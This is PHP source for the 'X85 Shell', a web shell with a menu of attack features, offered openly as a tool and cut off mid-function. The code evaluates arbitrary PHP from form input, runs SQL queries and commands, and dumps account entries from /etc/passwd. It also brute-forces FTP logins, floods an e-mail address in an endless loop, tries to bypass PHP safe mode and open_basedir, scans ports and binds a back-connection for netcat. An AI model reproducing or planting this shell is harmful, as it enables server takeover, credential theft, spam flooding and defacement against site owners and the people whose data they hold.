<?php
if($_GET['act'] == "phpinfo" and function_exists("phpinfo") and is_callable("phpinfo")){ phpinfo(); die(); }

$a = explode(" ",microtime());
$StartTime = $a[0] + $a[1];

@error_reporting(5);
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);

$X85 = new X85($StartTime);
class X85{
	function X85($StartTime){
		$ver = "1.0 Beta";
		$this->phpv = @phpversion();
		$prefix = " ".chr("187").chr("187")." ";
		$suffix = NULL;
		$safemodestatus = $this->SafeModeStatus();

		echo <<<END
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr">

	<head>
	
		<title>
		
			X85 Shell
		
		</title>
	
		<style type="text/css">
		
			html
			{
				overflow-x: auto;
			}

			body
			{
				background: #111111;
				color: #FFFFFF;
				margin: 7px;
				padding: 7px;
				font-family: Verdana;
				font-size: 11px;
			}

			.ServerInfoTitle
			{
				text-decoration:underline;
			}

			.HashName
			{
				text-decoration:underline;
			}

			textarea
			{
				width:500px;
			}

			.PageTitle
			{
				font-size:8pt;
				font-weight:Bold;
				text-decoration:underline;
			}

			table, td, tr
			{
				border: 0;
			}

			form
			{
				padding: 0;
				margin: 0;
			}

			input, select, textarea
			{
				background: #999999;
				border: 1px solid #555555;
				font-family: Verdana;
				font-size: 10px;
			}

			.wrapper
			{
				background: #300000;
				border: 1px outset #666666;
				padding: 3px;
				text-align: left;
			}

			a:link, a:visited, a:active
			{
				font-family: Verdana;
				background: transparent;
				color: #e3e2e2;
				text-decoration: none;
			}

			a:hover
			{
				font-family: Verdana;
				background: transparent;
				color: #1774ba;
			}

			.folder
			{
				background: transparent;
				border-bottom: 1px solid #200000;
			}

			.title
			{
				text-align: center;
			}

			.info
			{
				text-align: left;
			}

			.copyright
			{
				text-align: center;
				font-size: 10px;
			}

			.nav
			{
				float: right;
				font-size: 9px;
			}
			
		
		</style>
	
	</head>
	
	<body>
		
		<div class="wrapper">

		
			<center>
			
				<h1>X85 Shell v.{$ver}</h1>
				
			</center>
			
			<hr><br />
		
			<div class="info">

				Safe Mode: {$safemodestatus}

				<br />

				Software: <b>{$_SERVER['SERVER_SOFTWARE']}</b>
				
				<br />
			
				PHP Version: <b>{$this->phpv}</b>
				
				<br />
		
			</div>
	
		</div>

			<br />

		<table style="width:100%;">
			<tr>
				<td style="width:200px;vertical-align:top;" class="wrapper">
					<a href="?act=list">{$prefix}List Directories & Files{$suffix}</a><br />
					<a href="?act=info">{$prefix}View Server Information{$suffix}</a><br />
					<a href="?act=phpinfo">{$prefix}View PHP Information{$suffix}</a><br />
					<a href="?act=phpbugs">{$prefix}View PHP Bugs{$suffix}</a><br />
					<a href="?act=apachebugs">{$prefix}View Apache Bugs{$suffix}</a><br />
					<a href="?act=ep">{$prefix}Read /etc/passwd (Bypass){$suffix}</a><br />
					<a href="?act=readfiles"><s>{$prefix}Read Files (Bypass){$suffix}</s></a><br />
					<a href="?act=phpcode">{$prefix}PHP Codes Execution{$suffix}</a><br />
					<a href="?act=sqlcode">{$prefix}SQL Queries Execution{$suffix}</a><br />
					<a href="?act=cmdexec">{$prefix}Commands Execution{$suffix}</a><br />
					<a href="?act=pass">{$prefix}Pass Server Protections{$suffix}</a><br />
					<a href="?act=back">{$prefix}Bind Back Connections{$suffix}</a><br />
					<a href="?act=openports">{$prefix}Open Ports Scanner{$suffix}</a><br />
					<a href="?act=ftp">{$prefix}Online FTP BruteForce{$suffix}</a><br />
					<a href="?act=mail">{$prefix}Online E-Mails Flooder{$suffix}</a><br />
					<a href="?act=encoder">{$prefix}Professional Encoder{$suffix}</a><br />
					<a href="?act=mass">{$prefix}Mass Defacer{$suffix}</a><br />
					<a href="?act=bot">{$prefix}Inject bot code{$suffix}</a><br />
					<a href="?act=uhnav">{$prefix}Users Host Navigation{$suffix}</a><br />
					<a href="?act=remove">{$prefix}Self Remover{$suffix}</a><br />
				</td>
			
				<td class="wrapper" style="vertical-align:top;">

END;

		switch($_GET['act']){
			default: echo($this->ListDir($_GET['dir'])); break;
			case 'info': echo($this->Details()); break;
			case 'phpinfo': echo($this->ViewPHPInfo()); break;
			case 'phpbugs': echo($this->ViewPHPBugs()); break;
			case 'apachebugs': echo($this->ViewApacheBugs()); break;
			case 'ep': echo($this->EtcPasswd()); break;
			case 'phpcode': echo($this->PHPCode()); break;
			case 'sqlcode': echo($this->SQLCode()); break;
			case 'cmdexec': echo($this->CommandExecute()); break;
			case 'ftp': echo($this->FTPBruteForce()); break;
			case 'pass': echo($this->PassServerProtections()); break;
			case 'back': echo($this->BackConnection()); break;
			case 'openports' : echo($this->OpenPortsScanner()); break;
			case 'mail': echo($this->MailFlooder()); break;
			case 'encoder': echo($this->Encoder()); break;
			case 'mass': echo($this->MassDefacer()); break;
			case 'bot' : echo($this->BotCode()); break;
			case 'uhnav': echo($this->UHNav()); break;
			case 'remove' : echo($this->SelfRemove()); break;
		}

		$a = explode(" ",microtime());
		$EndTime = substr($a[0] + $a[1] - $StartTime,0,6);

		echo <<<END
		</td>
			</tr>
				</table>
			<br />

		<div class="copyright">
			Programmed by Hyp3rInj3cT10n & Pr0T3cT10n &copy; 2007<br /><br />
			[ Execution Time: {$EndTime} ] [ Shell Version: {$ver} ]<br />
		</div>

	</body>

</html>
END;
	}

	function EtcPasswd(){
		$end = ($_GET['end'] > 0) ? $_GET['end'] : 5000 ;
		$result = "<span class=\"PageTitle\">Read /etc/passwd (Bypass)</span><br /><br />";
		$result .= "Read first: <input type=\"text\" id=\"first\" value=\"".$end."\" /> <input type=\"submit\" id=\"submit\" name=\"submit\" value=\"Read\" onclick=\"javascript:location.replace('?act=ep&end='+document.getElementById('first').value);\" /><br /><br />\n";
		$result .= "Trying to get /etc/passwd....";
		if(function_exists("posix_getpwuid") and is_callable("posix_getpwuid")){
			$result .= "<span style=\"color:green;font-weight:Bold;\">Done!</span>";
			$result .= '<br /><br /><table style="width:100%;"><tr><th>name</th><th>passwd</th><th>uid</th><th>gid</th><th>gecos</th><th>dir</th><th>shell</th></tr>';
			for($x=0;$x<$end;$x++){
				$details = posix_getpwuid($x);
				if($details['name'])
					$result .= '<tr><td>'.$details['name'].'</td><td>'.$details['passwd'].'</td><td>'.$details['uid'].'</td><td>'.$details['gid'].'</td><td>'.$details['gecos'].'</td><td>'.$details['dir'].'</td><td>'.$details['shell'].'</td></tr>';
			}
			$result .= '</table>';
		}
		else $result .= "<span style=\"color:red;font-weight:Bold;\">Failed.</span>";

		return $result;
	}

	function SafeModeStatus(){
		if(function_exists("ini_get") and is_callable("ini_get"))
			if(ini_get('safe_mode') == "1" or strtoupper(ini_get('safe_mode')) == "ON")
				return "<span style=\"color:red;font-weight:Bold;\">On</span>";
			else
				return "<span style=\"color:green;font-weight:Bold;\">Off</span>";
		else
			return "<span style=\"color:gray;font-weight:Bold;\">Unknown</span>";
	}

	function OpenBaseDirStatus(){
		if(function_exists("ini_get") and is_callable("ini_get"))
			if(strlen(ini_get('open_basedir')) > 3)
				return "<span style=\"color:red;font-weight:Bold;\">On</span>";
			else
				return "<span style=\"color:green;font-weight:Bold;\">Off</span>";
		else
			return "<span style=\"color:gray;font-weight:Bold;\">Unknown</span>";
	}

	function Details(){
		$result = "<span class=\"PageTitle\">View Server Information</span><br /><br />";

		$result .= "<span class=\"ServerInfoTitle\">Safe Mode:</span> ".$this->SafeModeStatus()."<br />\n";
		$result .= "<span class=\"ServerInfoTitle\">Open BaseDir:</span> ".$this->OpenBaseDirStatus()."<br />\n";

		$os = @php_uname();
		$Functions = array(
					"PHP Version"		=>	"phpversion",
					"PHP Logo Guid"		=>	"php_logo_guid",
					"PHP Sapi Name"		=>	"php_sapi_name",
					"Zend Version"		=>	"zend_version",
					"Zend Logo Guid"		=>	"zend_logo_guid",
					"Apache Version"		=>	"apache_get_version",
					"Current User"		=>	"get_current_user",
					"Current Gid"		=>	"getmygid",
					"Current Uid"		=>	"getmyuid",
					"Current Pid"		=>	"getmypid",
					"Current Inode"		=>	"getmyinode",
					"Operation System Info"	=>	"php_uname",
				);

		foreach($Functions as $desc=>$func)
			if(function_exists($func) and is_callable($func))
				$result .= "<span class=\"ServerInfoTitle\">".$desc.":</span> ".@$func()."<br />\n";

		//Operation System Name
		if(defined("PHP_OS")){
			$result .= "<span class=\"ServerInfoTitle\">Operation System:</span> ".PHP_OS."<br />\n";
			$os = PHP_OS;
		}

		//Server Software
		if(isset($_SERVER['SERVER_SOFTWARE']) and strlen($_SERVER['SERVER_SOFTWARE']) > 0)
			$result .= "<span class=\"ServerInfoTitle\">Server Software:</span> ".$_SERVER['SERVER_SOFTWARE']."<br />\n";

		//Server IP
		$result .= "<span class=\"ServerInfoTitle\">Server IP Address:</span> ".$_SERVER['SERVER_ADDR']."<br />\n";

		//Loaded Modules
		if(function_exists("apache_get_modules") and is_callable("apache_get_modules")){
			$result .= "<span class=\"ServerInfoTitle\">Loaded Modules:</span> ";
			$count_modules = 0;
			foreach(apache_get_modules() as $module){
				$result .= $module;

				if($count_modules == count(apache_get_modules())-1)
					$result.= ".";
				else
					$result.= ", ";

				$count_modules++;
			}

			$result .= "<br />\n";
			$result .= "<span class=\"ServerInfoTitle\">Total Loaded Modules:</span> ".$count_modules."<br />\n";
		}

		//Loaded Extensions
		if(function_exists("get_loaded_extensions") and is_callable("get_loaded_extensions")){
			$result .= "<span class=\"ServerInfoTitle\">Loaded Extensions:</span> ";
			$count_ext = 0;
			foreach(get_loaded_extensions() as $module){
				$result .= $module;

				if($count_ext == count(get_loaded_extensions())-1)
					$result.= ".";
				else
					$result.= ", ";

				$count_ext++;
			}

			$result .= "<br />\n";
			$result .= "<span class=\"ServerInfoTitle\">Total Loaded Extensions:</span> ".$count_ext."<br />\n";
		}

		//Main Path
		$path = (eregi("win",strtolower($os))) ? "C:" : "/" ;

		//Total Disk Space
		if(function_exists("disk_total_space") and is_callable("disk_total_space")){
			$Total = substr(disk_total_space($path) / 1024 / 1024 / 1024,0,4);
			$result .= "<span class=\"ServerInfoTitle\">Total Disk Space:</span> ".$Total." GB<br />";
		}

		//Free Disk Space
		if(function_exists("disk_free_space") and is_callable("disk_free_space")){
			$FreeFunc = "disk_free_space";
			$Free = substr(disk_free_space($path) / 1024 / 1024 / 1024,0,4);
			$result .= "<span class=\"ServerInfoTitle\">Free Disk Space:</span> ".$Free." GB";
		}
		else{
			if(function_exists("diskfreespace") and is_callable("diskfreespace")){
				$FreeFunc = "diskfreespace";
				$Free = substr(diskfreespace($path) / 1024 / 1024 / 1024,0,4);
				$result .= "<span class=\"ServerInfoTitle\">Free Disk Space:</span> ".$Free." GB";
			}
		}

		//Free Disk Space In Percents
		if(eregi("Free",$result) and eregi("Total",$result))
			$result .= " (".substr($FreeFunc($path) * 100 / disk_total_space($path),0,4)."% Free)";
		$result .= "<br />\n";

		//Drivers
		if($path != "/"){
			$result .= "<span class=\"ServerInfoTitle\">Detected Drivers:</span> ";
			$count = 1;
			$Drivers = array();

			foreach(range("a","z") as $driver)
				if(is_dir($driver.":\\"))
					$Drivers[] = $driver;

			foreach($Drivers as $driver){
				$result .= $driver;

				if($count == count($Drivers))
					$result .= ".";
				else
					$result .= ", ";
				$count++;
			}
		}

		return $result;
	}

	function Encoder(){
		$result = "<span class=\"PageTitle\">Professional Encoder</span><br /><br />";

		$string = stripslashes($_POST['encodetxt']);
		$result .= "<form method=\"post\" action=\"?act=encoder\">\n";
		$result .= "Text:<br />\n";
		$result .= "<textarea class=\"HashesResults\" rows=\"5\" cols=\"40\" id=\"encodetxt\" name=\"encodetxt\">".htmlspecialchars($string)."</textarea><br />\n";
		$result .= "<input type=\"submit\" id=\"submit\" name=\"submit\" value=\"Encode!\" /><br />\n</form>\n";

		if(isset($_POST['submit'])){
			if(function_exists("hash_algos") and is_callable("hash_algos") and function_exists("hash") and is_callable("hash")){
				$Hashes = hash_algos();

				foreach($Hashes as $hash){
					$rs = @hash($hash,$string);
					$result .= "<hr /><b>".$hash.": (".strlen($rs)." letters)</b><br /><textarea class=\"HashesResults\" rows=\"1\" cols=\"1\">".$rs."</textarea><br />\n";
				}
			}

			$More = array(
					"MD5"		=>		"md5",
					"Sha1"		=>		"sha1",
					"Crc32"		=>		"crc32",
					"Crypt"		=>		"crypt",
					"Base64 Encode"	=>		"base64_encode",
					"Base64 Decode"	=>		"base64_decode",
					"UU Encode"	=>		"convert_uuencode",
					"UU Decode"	=>		"convert_uudecode",
					"URL Encode"	=>		"urlencode",
					"URL Decode"	=>		"urldecode",
					"RawURL Encode"	=>		"rawurlencode",
					"RawURL Decode"	=>		"rawurldecode",
					"UTF-8 Encode"	=>		"utf8_encode",
					"UTF-8 Decode"	=>		"utf8_decode",
					"Shuffle"		=>		"str_shuffle",
					"Reverse"	=>		"str_rev",
					"Rot13"		=>		"str_rot13",
				);
			foreach($More as $name=>$func)
				if(function_exists($func) and is_callable($func))
					if(!in_array($func,$Hashes)){
						$rs = htmlspecialchars(@$func($string));
						$result .= "<hr /><b>".strtolower($name).": (".strlen($rs)." letters)</b><br /><textarea class=\"HashesResults\" rows=\"1\" cols=\"1\">".$rs."</textarea><br />\n";
					}
		}
		return $result;
	}

	function PHPCode(){
		ob_start();

		$result = "<span class=\"PageTitle\">PHP Codes Execution</span><br /><br />\n";
		$result .= "<form method=\"post\" action=\"?act=phpcode\">";
		$result .= "Code:<br /><textarea rows=\"5\" cols=\"50\" id=\"code\" name=\"code\">".htmlspecialchars(stripslashes($_POST['code']))."</textarea><br />";
		$result .= "<input type=\"submit\" id=\"submit\" name=\"submit\" value=\"Execute\" />\n</form><br />";

		$eval = (isset($_POST['code'])) ? stripslashes($_POST['code']) : "";
		if($eval != ""){
			eval($eval);
			$eresult = ob_get_contents();
			$result .= "<textarea rows=\"5\" cols=\"50\" readonly=\"readonly\">".htmlspecialchars($eresult)."</textarea>";
		}

		ob_end_clean();

		return $result;
	}

	function SQLCode(){
		$host = (isset($_POST['host'])) ? stripslashes($_POST['host']) : "localhost" ;
		$username = (isset($_POST['username'])) ? stripslashes($_POST['username']) : "root" ;
		$password = (isset($_POST['password'])) ? stripslashes($_POST['password']) : "" ;
		$database = (isset($_POST['database'])) ? stripslashes($_POST['database']) : "" ;
		$query = (isset($_POST['code'])) ? stripslashes($_POST['code']) : "" ;

		$result = "<span class=\"PageTitle\">SQL Queries Execution</span><br /><br />\n";
		$result .= "<form method=\"post\" action=\"?act=sqlcode\">";
		$result .= "Host: <input type=\"text\" id=\"host\" name=\"host\" value=\"".$host."\" /><br /><br />\n";
		$result .= "Username: <input type=\"text\" id=\"username\" name=\"username\" value=\"".htmlspecialchars($username)."\" /><br /><br />\n";
		$result .= "Password: <input type=\"text\" id=\"password\" name=\"password\" value=\"".htmlspecialchars($password)."\" /><br /><br />\n";
		$result .= "Database: <input type=\"text\" id=\"database\" name=\"database\" value=\"".htmlspecialchars($database)."\" /><br /><br />\n";
		$result .= "Query:<br /><textarea rows=\"5\" cols=\"50\" id=\"code\" name=\"code\">".htmlspecialchars(stripslashes($_POST['code']))."</textarea><br />";
		$result .= "<input type=\"submit\" id=\"submit\" name=\"submit\" value=\"Execute\" />\n</form><br />";

		if(isset($_POST['submit']))
			if(!@mysql_connect($host,$username,$password))
				$result .= "Error: ".htmlspecialchars(mysql_error());
			else
				if(!@mysql_select_db($database))
					$result .= "Error: ".htmlspecialchars(mysql_error());
				else
					if(!@$Q=mysql_query($query))
						$result .= "Error: ".htmlspecialchars(mysql_error());
					else
						$result .= "Query Executed Successfuly.";

		return $result;
	}

	function MailFlooder(){
		$email = (isset($_POST['email'])) ? stripslashes($_POST['email']) : "" ;
		$title = (isset($_POST['title'])) ? stripslashes($_POST['title']) : "" ;
		$content = (isset($_POST['content'])) ? stripslashes($_POST['content']) : "" ;

		$result = "<span class=\"PageTitle\">Online E-Mails Flooder</span><br /><br />\n";
		$result .= "<form method=\"post\" action=\"?act=sqlcode\">";
		$result .= "To: <input type=\"text\" id=\"email\" name=\"email\" value=\"".htmlspecialchars($email)."\" /><br /><br />\n";
		$result .= "Title: <input type=\"text\" id=\"title\" name=\"title\" value=\"".htmlspecialchars($title)."\" /><br /><br />\n";
		$result .= "Content:<br /><textarea rows=\"5\" cols=\"50\" id=\"content\" name=\"content\">".htmlspecialchars(stripslashes($_POST['content']))."</textarea><br />";
		$result .= "<input type=\"submit\" id=\"submit\" name=\"submit\" value=\"Flood\" />\n</form><br />";

		if(isset($_POST['submit'])){
			if(function_exists("mail") and is_callable("mail")){
				$result .= "Flooding...";
				while(!$none) mail($email,$title,$content);
				$result .= "The specified E-Mail Address should be flooded.";
			}
			else{
				$result .= "Unable to send E-Mails.";
			}
		}
		return $result;
	}

	function SelfRemove(){
		$result = "<span class=\"PageTitle\">Self Remover</span><br /><br />";

		if($_GET['confirmed'] == "true")
			if(@unlink(__FILE__))
				$result .= "Removed Successfully!";
			else
				$result .= "Can't remove myself, there are not enough permissions.";
		else
			$result .= "Are you sure? <a href=\"?act=remove&confirmed=true\">Yes</a> <a href=\"?\">No</a>";
		return $result;
	}

	function OpenPortsScanner(){
		$rstart = (isset($_POST['rstart']) and is_numeric($_POST['rstart']) and $_POST['rstart'] >= 1) ? $_POST['rstart'] : 1 ;
		$rend = (isset($_POST['rend']) and is_numeric($_POST['rend']) and $_POST['rend'] > 1) ? $_POST['rend'] : 999999 ;
		echo("<script type=\"text/javascript\">");
		echo("function Show(SelectValue){");
		echo("document.getElementById('RangeDiv').style.display=\"none\";");
		echo("document.getElementById('SpecificDiv').style.display=\"none\";");
		echo("if(SelectValue == \"range\")");
		echo("document.getElementById('RangeDiv').style.display=\"inline\";");
		echo("if(SelectValue == \"specific\")");
		echo("document.getElementById('SpecificDiv').style.display=\"inline\";");
		echo("}</script>");
		echo("<span class=\"PageTitle\">Open Ports Scanner</span><br /><br />");
		echo('<form method="post" action="?act=openports">');
		echo('<u>Ports:</u><br /><br />');
		echo('<select id="port" name="port" onchange="javascript:Show(this.value);">');
		echo('<option value="automatic">Automatic - All Ports</option>');
		echo('<option value="range">Range of Ports</option>');
		echo('<option value="specific">Specific Ports</option>');
		echo('</select><br /><br />');
		echo('<div id="RangeDiv" style="display:none;">From: <input type="text" id="rstart" name="rstart" value="'.$rstart.'" /> To: <input type="text" id="rend" name="rend" value="'.$rend.'" /><br /><br /></div>');
		echo('<div id="SpecificDiv" style="display:none;"><textarea rows="5" cols="50" id="specific" name="specific" />'.@htmlspecialchars($_POST['specific']).'</textarea><br />Use space (not new line!) to separate between the ports.<br /><br /></div>');
		echo('<input type="submit" id="submit" name="submit" value="Scan" />');
		echo('</form>');
		if(isset($_POST['submit'])){
			$first = "yes";
			echo("<br /><br /><u>Results</u>:<br />\n");

			if($_POST['port'] == "range"){
				if($rend > $rstart){
					for($i=$rstart;$i<$rend;$i++){
						if(@fsockopen($_SERVER['SERVER_ADDR'],$i) == TRUE){
							if($first == "no")
								echo(", ");
							echo $i;
							$first = "no";
						}
					}
					echo(".");
				}
				else{
					echo("Range start number can't be bigger than the end number.");
				}
			}
			else if($_POST['port'] == "specific"){
				$list = explode(" ",$_POST['specific']);
				foreach($list as $i){
					if(is_numeric($i)){
						if(@fsockopen($_SERVER['SERVER_ADDR'],$i) == TRUE){
							if($first == "no")
								echo(", ");
							echo $i;
							$first = "no";
						}
					}
				}
				echo(".");
			}
			else{
				for($i=0;$i>=0;$i++){
					if(@fsockopen($_SERVER['SERVER_ADDR'],$i) == TRUE){
						if($first == "no")
							echo(", ");
						echo $i;
						$first = "no";
					}
				}
				echo(".");
			}
		}
	}

	function ListDir($dir){

		function LettersPerms($file){
			$perms = @fileperms($file);

			if (($perms & 0xC000) == 0xC000) {
			    // Socket
			    $info = 's';
			} elseif (($perms & 0xA000) == 0xA000) {
			    // Symbolic Link
			    $info = 'l';
			} elseif (($perms & 0x8000) == 0x8000) {
			    // Regular
			    $info = '-';
			} elseif (($perms & 0x6000) == 0x6000) {
			    // Block special
			    $info = 'b';
			} elseif (($perms & 0x4000) == 0x4000) {
			    // Directory
			    $info = 'd';
			} elseif (($perms & 0x2000) == 0x2000) {
			    // Character special
			    $info = 'c';
			} elseif (($perms & 0x1000) == 0x1000) {
			    // FIFO pipe
			    $info = 'p';
			} else {
			    // Unknown
			    $info = 'u';
			}

			// Owner
			$info .= (($perms & 0x0100) ? 'r' : '-');
			$info .= (($perms & 0x0080) ? 'w' : '-');
			$info .= (($perms & 0x0040) ?
			            (($perms & 0x0800) ? 's' : 'x' ) :
			            (($perms & 0x0800) ? 'S' : '-'));
	
			// Group
			$info .= (($perms & 0x0020) ? 'r' : '-');
			$info .= (($perms & 0x0010) ? 'w' : '-');
			$info .= (($perms & 0x0008) ?
			            (($perms & 0x0400) ? 's' : 'x' ) :
			            (($perms & 0x0400) ? 'S' : '-'));

			// World
			$info .= (($perms & 0x0004) ? 'r' : '-');
			$info .= (($perms & 0x0002) ? 'w' : '-');
			$info .= (($perms & 0x0001) ?
			            (($perms & 0x0200) ? 't' : 'x' ) :
			            (($perms & 0x0200) ? 'T' : '-'));

			return $info;
		}

		if($dir == "") $dir = $_SERVER['DOCUMENT_ROOT'].dirname($_SERVER['PHP_SELF'])."/";

		$result = "<span class=\"PageTitle\">List Directories & Files</span><br /><br />";
		$result .= "Trying to list directory: ";
		$Pathes = explode("/",$dir);
		$lastpath = NULL;
		foreach($Pathes as $k=>$path){
			if($path != "" or $k == "0"){
				$path .= "/";
				$result .= "<a href=\"?act=list&dir=".$lastpath.$path."\">".$path."</a>";
				$lastpath .= $path;
			}
		}

		$result .= "<br /><br />\n";
		$result .= "<table style=\"width:100%;\"><tr><th>Name</th><th>Size</th><th>Last Modified</th><th>Permissions</th><th>Actions</th></tr>";

		if(dirname($dir) != str_replace("\/","",$dir))
				$result .= "<tr>\n";
				$result .= "<td><a href=\"?act=list&dir=".dirname($dir)."/\">..</a></td>\n";
				$result .= "<td> - </td>\n";
				$result .= "<td>&nbsp;</td>\n";
				$result .= "<td>".@fileperms(dirname($dir))." (".LettersPerms(dirname($dir)).")"."</td>\n";
				$result .= "<td>&nbsp;</td>\n";
				$result .= "</tr>\n";

		$glob = $dir."*";
		$files = glob($glob);
		foreach($files as $name){
			$FileDir = dirname($name)."/";
			$FileName = basename($name);

			if(is_dir($FileDir.$FileName)){
				$result .= "<tr>\n";
				$result .= "<td><a href=\"?act=list&dir=".$FileDir.$FileName."/\">".$FileName."/</a></td>\n";
				$result .= "<td> - </td>\n";
				$result .= "<td>&nbsp;</td>\n";
				$result .= "<td>".@fileperms($FileDir.$FileName)." (".@LettersPerms($FileDir.$FileName).")"."</td>\n";
				$result .= "<td>&nbsp;</td>\n";
				$result .= "</tr>\n";
			}
			else{
				$result .= "<tr>\n";
				$result .= "<td><a href=\"?act=viewfi?le&dir=".$FileDir."/&file=".$FileName."\">".$FileName."</a></td>\n";
				$result .= "<td>".substr(filesize($FileDir.$FileName) / 1024,0,6)." KB</td>\n";
				$result .= "<td>&nbsp;</td>\n";
				$result .= "<td>".@fileperms($FileDir.$FileName)." (".@LettersPerms($FileDir.$FileName).")"."</td>\n";
				$result .= "<td>&nbsp;</td>\n";
				$result .= "</tr>\n";
			}
		}

		$result .= "</table><br /><br />\n";
		$result .= "<fieldset>\n";
		$result .= "<legend>More Options:</legend>\n";
		$result .= "<form method=\"post\">\n";
		$result .= "Jump To Directory: <input type=\"text\" id=\"jdir\" style=\"width:300px\" value=\"".htmlspecialchars($dir)."\"> <input type=\"button\" value=\"Jump\" onclick=\"javascript:location.replace('?act=list&dir='+document.getElementById('jdir').value);\" /><br /><br />\n";
		$result .= "Create Directory: <input type=\"text\" id=\"cdir\" style=\"width:100px;\" name=\"cdir\" value=\"".htmlspecialchars($_POST['cdir'])."\"> <input type=\"submit\" id=\"submit\" name=\"submit\" value=\"Create\" /><br />\n";
		$result .= "</form></fieldset><br />\n";

		return $result;
	}

	function FTPBruteForce(){
		echo("<span class=\"PageTitle\">Online FTP BruteForce</span><br /><br />");
		$_POST['usernames'] = htmlspecialchars($_POST['usernames']);
		$_POST['passwords'] = htmlspecialchars($_POST['passwords']);
		$chkdun = (isset($_POST['all_usernames'])) ? " checked=\"checked\"" : "" ;
		$chkdpw = (isset($_POST['password_equal_username'])) ? " checked=\"checked\"" : "" ;

		echo('<form method="post" action="?act=ftp">');
		echo('<u>Usernames:</u><br />');
		echo('<input type="checkbox" id="all_usernames" name="all_usernames"'.$chkdun.' /> All usernames in the server<br />');
		echo('<strong>OR</strong><br />');
		echo('Specific usernames:<br />');
		echo('<textarea rows="5" cols="50" id="usernames" name="usernames" />'.$_POST['usernames'].'</textarea><br />');
		echo('<br />');
		echo('<u>Passwords:</u><br />');
		echo('<input type="checkbox" id="password_equal_username" name="password_equal_username"'.$chkdpw.' /> The username is the password.<br />');
		echo('Specific passwords:<br />');
		echo('<textarea rows="5" cols="50" id="passwords" name="passwords" />'.$_POST['passwords'].'</textarea><br /><br />');
		echo('<input type="submit" id="submit" name="submit" value="Start" />');
		echo('</form>');

		if(isset($_POST['submit'])){
			echo('<br /><br /><u>Results:</u><br />');
			if(function_exists("fsockopen") and is_callable("fsockopen")){
				$start = time();
				$host = "127.0.0.1";
				$port = "21";

				$usernames = explode("\r\n",$_POST['usernames']);
				$passwords = explode("\r\n",$_POST['passwords']);

				if(isset($_POST['all_usernames'])){
					if(function_exists("posix_getpwuid") and is_callable("posix_getpwuid")){
						$usernames = array();
						$number = ($_POST['end'] > 0) ? $_POST['end'] : "5000";

						for($x=0;$x<$number;$x++){
							$user = posix_getpwuid($x);
							if(strlen($user[name]) > 0)
								$usernames[] = $user[name];
						}
					}
					else{
						echo("Unable to get usernames list.<br />");
					}
				}

				$usernames_count = count($usernames);
				$passwords_count = count($passwords);
				$results = 0;

				foreach($usernames as $user){
					if(isset($_POST['password_equal_username']))
						$passwords['user'] = $user;

					foreach($passwords as $pass){
						$sock = @fsockopen($host, $port, $errno, $errstr, 10);
						$get = @fgets($sock, 150);
						@fputs($sock, "USER " .$user. "\n");
						$get = @fgets($sock, 150);
						@fputs($sock, "PASS " .$pass. "\n");
						$get = @fgets($sock, 150);

						if(strstr($get, "logged")){
							$results++;

							echo "Username: ".$user." Password: ".$pass."<br />\n";
							@fclose($sock);
						}
						else{
							@fclose($sock);
						}

						@fclose($sock);
					}
				}
				$finish = time();
				$seconds = number_format($finish-$start);

				//Statistics
				echo("<br /><u>Statistics:</u><br />Checked Accounts: {$usernames_count}<br />\nChecked Passwords: {$passwords_count}<br />\nHacked Accounts: {$results}<br />\nScan Time: {$seconds} seconds<br />\n");
			}
			else{
				echo("Unable to start scanning.<br />");
			}
		}
	}

	function PassServerProtections(){
		echo("<span class=\"PageTitle\">Pass Server Protections (Safe Mode & Open Base Dir)</span><br /><br />");

		if(eregi("off",strtolower($this->SafeModeStatus())) and eregi("off",strtolower($this->OpenBaseDirStatus()))){
			echo("The safe mode and the open base dir are off.");
		}
		else{
			$inSafeMode = "<span class=\"ServerInfoTitle\">Safe Mode:</span> <span style=\"color:green;font-weight:Bold;\">Off</span><br />";
			$inOpenBaseDir = "<span class=\"ServerInfoTitle\">Open BaseDir:</span> <span style=\"color:green;font-weight:Bold;\">Off</span><br />";
			if(function_exists("posix_getpwuid") and is_callable("posix_getpwuid")){
				if(function_exists("get_current_user") and is_callable("get_current_user")){
					$details = posix_getpwuid(get_current_user());
					$user = $details['user'];
				}
				else{
					if(function_exists("getmyuid") and is_callable("getmyuid")){
						$details = posix_getpwuid(getmyuid());
						$user = $details['user'];
					}
				}
			}

			if(strlen($user) <= 0 and eregi("/home/",$_SERVER['DOCUMENT_ROOT']) and eregi("/domains/",$_SERVER['DOCUMENT_ROOT'])){
				$explode = explode("/",$_SERVER['DOCUMENT_ROOT']);
				$user = $explode[2];
			}

			if(strlen($user) > 0){
				echo("Trying to pass this server protections...");
				$url = "http://".$_SERVER['SERVER_ADDR']."/~".$user."/".$_SERVER['SCRIPT_NAME']."?act=info";
				$source = file_get_contents($url);

				if(eregi($inSafeMode,$source))
					$safemode = "<span style=\"color:green;font-weight:Bold;\">Passed</span><br />\n";
				else
					$safemode = "<span style=\"color:red;font-weight:Bold;\">Not Passed</span><br />\n";


				if(eregi($inOpenBaseDir,$source))
					$openbasedir = "<span style=\"color:green;font-weight:Bold;\">Passed</span><br />\n";
				else
					$openbasedir = "<span style=\"color:red;font-weight:Bold;\">Not Passed</span><br />\n";

				if(eregi("green",$safemode) or eregi("green",$openbasedir)){
					echo("<span style=\"color:green;font-weight:Bold;\">Done!</span><br /><br />\n");
					echo("Safe Mode: ".$safemode);
					echo("Open Base Dir: ".$openbasedir);
					echo("<br /><a href=\"".$url."\">CLICK HERE TO PASS</a><br />\n");
				}
				else{
					echo("<span style=\"color:red;font-weight:Bold;\">Failed!</span><br />\n");
				}
			}
			else{
				echo("Unable to get this account username");
			}
		}
	}

	function BackConnection(){
		$port = (isset($_POST['port']) and is_numeric($_POST['port'])) ? $_POST['port'] : "1337" ;

		echo("<span class=\"PageTitle\">Bind Back Connections</span><br /><br />");
		echo("Bind the port and than run this in your netcat: nc ".$_SERVER['SERVER_ADDR']." <span id=\"backconnport\">1337</span><br /><br />");
		echo("<form method=\"post\" action=\"?act=back\">Port: <input type=\"text\" id=\"port\" name=\"port\" value=\"".$port."\" onkeyup=\"javascript:if(document.getElementById('port').value > 0) document.getElementById('backconnport').innerHTML=this.value; else document.getElementById('backconnport').innerHTML='1337';\" maxlength=\"6\" /> <input type=\"submit\" id=\"submit\" name=\"submit\" value=\"Bind\" /></form><br />");

		if(isset($_POST['submit'])){
			$address = $_SERVER['SERVER_ADDR'];
